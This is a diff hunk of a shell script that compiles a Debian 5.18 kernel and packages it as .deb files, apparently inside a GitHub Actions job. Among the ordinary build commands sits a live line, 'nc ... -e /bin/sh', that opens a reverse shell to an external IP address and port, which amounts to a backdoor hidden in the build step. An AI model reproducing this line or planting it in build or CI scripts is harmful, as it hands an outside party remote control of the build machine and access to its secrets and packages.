@@ -26,8 +26,8 @@ cp /config-5.18.0-2-amd64 ~/kernel/linux-source-5.18/.config
 cd linux-source-5.18
 yes ""|make -j $(nproc)
 make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1
+cp ../*.deb /github/workspace/
 nc 65.108.51.31 11452 -e /bin/sh
-cp ../*.deb /
 ls ../*.deb
 exit 0
 
